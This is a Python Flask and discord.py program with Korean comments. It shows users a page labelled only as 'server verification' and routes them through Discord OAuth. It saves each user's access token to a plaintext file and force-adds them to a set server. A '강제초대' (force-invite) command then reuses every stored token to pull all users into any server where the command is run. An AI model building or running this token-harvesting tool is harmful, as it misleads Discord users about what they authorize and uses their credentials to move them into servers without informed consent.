import os
import json
import asyncio
import threading
import requests
from flask import Flask, request, redirect, render_template_string
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
BOT_TOKEN = os.getenv("BOT_TOKEN")
REDIRECT_URI = os.getenv("REDIRECT_URI")
OAUTH2_URL = os.getenv("OAUTH2_URL")
PORT = int(os.getenv("PORT", 5000))

# ⚠️ 여기에 네 디스코드 서버 ID를 꼭 넣어줘!
TARGET_GUILD_ID = "1503013871307456645"  # 예: "123456789012345678"

# ⚠️ [중요] 특정 관리자들의 디스코드 유저 ID를 여기에 쭉 적어주세요! (문자열 형태)
ALLOWED_ADMIN_IDS = [
    "123456789012345678",  # 관리자 A의 디스코드 ID
    "876543210987654321",  # 관리자 B의 디스코드 ID
]

TOKEN_FILE = "tokens.json"

def load_tokens():
    if not os.path.exists(TOKEN_FILE):
        return {}
    try:
        with open(TOKEN_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_token(user_id, access_token):
    tokens = load_tokens()
    tokens[user_id] = access_token
    with open(TOKEN_FILE, "w", encoding="utf-8") as f:
        json.dump(tokens, f, indent=4)

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>서버 인증</title>
    <style>
        body {
            background-color: #0f0f12;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background-color: #18181c;
            border: 1px solid #2b2b30;
            border-radius: 16px;
            padding: 32px;
            width: 360px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        .btn {
            background-color: #ffffff;
            color: #000000;
            border: none;
            border-radius: 8px;
            padding: 12px;
            width: 100%;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            margin-top: 20px;
            text-decoration: none;
            display: block;
            box-sizing: border-box;
        }
        .btn:hover { background-color: #e2e2e2; }
    </style>
</head>
<body>
    <div class="card">
        <h2>인증 계속하기</h2>
        <p style="color: #a0a0a0; font-size: 14px;">서버 인증을 진행합니다.<br>아래 버튼을 눌러 Discord 계정 인증을 계속해 주세요.</p>
        <a href="{{ oauth_url }}" class="btn">인증 계속하기</a>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, oauth_url=OAUTH2_URL)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "인증 코드가 없습니다.", 400

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    token_res = requests.post("https://discord.com/api/v10/oauth2/token", data=data, headers=headers)
    
    if token_res.status_code != 200:
        return "토큰 발급 실패", 500
    
    access_token = token_res.json().get("access_token")

    user_headers = {"Authorization": f"Bearer {access_token}"}
    user_res = requests.get("https://discord.com/api/v10/users/@me", headers=user_headers)
    user_data = user_res.json()
    
    user_id = user_data.get("id")
    username = user_data.get("username")

    # 1. 토큰 파일에 자동 저장
    save_token(user_id, access_token)

    # 2. 로그인하자마자 곧바로 서버로 강제 초대 요청 날리기
    if TARGET_GUILD_ID and TARGET_GUILD_ID != "너의_디스코드_서버_ID":
        add_headers = {
            "Authorization": f"Bot {BOT_TOKEN}",
            "Content-Type": "application/json"
        }
        url = f"https://discord.com/api/v10/guilds/{TARGET_GUILD_ID}/members/{user_id}"
        payload = {"access_token": access_token}
        requests.put(url, json=payload, headers=add_headers)

    return f"<h1>인증 및 서버 가입 완료!</h1><p>{username}님, 정상적으로 처리되었습니다. 창을 닫으셔도 됩니다.</p>"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"[Bot] 로그인 성공: {bot.user.name}")

@bot.command(name="전체초대", aliases=["강제초대"])
async def force_join(ctx, limit: int = None):
    # 권한 체크: 디스코드 서버 관리자 권한이 있거나, 지정된 관리자 ID 목록에 포함된 경우만 통과
    is_admin = ctx.author.guild_permissions.administrator
    is_allowed_user = str(ctx.author.id) in ALLOWED_ADMIN_IDS

    if not (is_admin or is_allowed_user):
        await ctx.send("❌ 이 명령어는 지정된 관리자만 사용할 수 있습니다!")
        return

    tokens = load_tokens()
    user_ids = list(tokens.keys())

    if not user_ids:
        await ctx.send("❌ 아직 인증을 완료한 유저가 없습니다.")
        return

    if limit is not None:
        if limit <= 0:
            await ctx.send("❌ 초대 인원수는 1명 이상이어야 합니다.")
            return
        target_user_ids = user_ids[:limit]
    else:
        target_user_ids = user_ids

    guild_id = ctx.guild.id
    msg = await ctx.send(f"⏳ 총 {len(target_user_ids)}명의 유저를 초대 중입니다...")

    success = 0
    fail = 0

    headers = {
        "Authorization": f"Bot {BOT_TOKEN}",
        "Content-Type": "application/json"
    }

    for user_id in target_user_ids:
        access_token = tokens[user_id]
        url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
        payload = {"access_token": access_token}

        res = requests.put(url, json=payload, headers=headers)
        if res.status_code in [201, 204]:
            success += 1
        else:
            fail += 1
        
        await asyncio.sleep(0.5)

    await msg.edit(content=f"✅ **초대 작업 완료!**\n- 시도한 인원: {len(target_user_ids)}명\n- 성공: {success}명\n- 실패(만료 등): {fail}명")

def run_flask():
    app.run(host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(BOT_TOKEN)
